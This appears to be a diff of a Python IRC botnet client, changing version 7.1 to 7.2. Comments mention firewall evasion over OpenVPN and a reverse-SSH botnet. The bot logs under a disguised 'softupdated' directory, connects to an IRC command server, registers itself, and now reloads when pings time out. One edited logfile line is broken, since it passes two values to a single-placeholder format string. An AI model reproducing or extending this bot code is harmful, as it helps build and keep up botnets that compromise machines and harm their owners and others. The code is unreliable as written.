@@ -29,10 +29,10 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "7.1"                                                                 # bot version
+version = "7.2"                                                                 # bot version
 
 try:
-    logfile(filename="/var/softupdated/bot_v%s.log" % version)                  # redirects bot output to logfile
+    logfile(filename="/var/softupdated/bot_v%s.log" % (version, strftime("%m-%d_%H:%M")))                  # redirects bot output to logfile
 except Exception as e:
     print e
 
@@ -507,7 +507,7 @@ if __name__ == '__main__':
                 irc.settimeout(60)                                              # timeout for irc.recv
                 irc.connect((server, port))
                 connection_time = time.time()
-                recv = irc.recv ( 4096 )
+                recv = irc.recv (4096)
                 log("[+] Recieved:    ", recv+'\n')
                 irc.send ('NICK %s\r\n' % nick )
                 irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
@@ -536,7 +536,7 @@ if __name__ == '__main__':
                     last_data = data    
                 except socket.timeout:
                     if time.time() - last_ping > threshold:                     # if reciving data times out and ping threshold is exceeded
-                        timedout_count += 5
+                        reload_bot()
                         pass
                     else:
                         data = str(time.time())
